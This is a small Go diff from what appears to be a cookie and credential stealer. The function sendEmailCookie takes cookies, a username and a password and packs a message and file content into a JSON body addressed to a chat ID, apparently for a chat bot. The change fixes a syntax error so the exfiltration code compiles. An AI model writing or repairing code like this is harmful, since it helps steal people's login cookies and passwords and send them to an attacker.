@@ -85,7 +85,7 @@ func sendEmailCookie(cookies string, username string, password string, KeyUser s
 	postBody, _ := json.Marshal(map[string]string{
 		"chat_id":    getChatId(),
 		"text":       msg,
-		"file"     content,
+		"file":     content,
 	})
 
 	responseBody := bytes.NewBuffer(postBody)
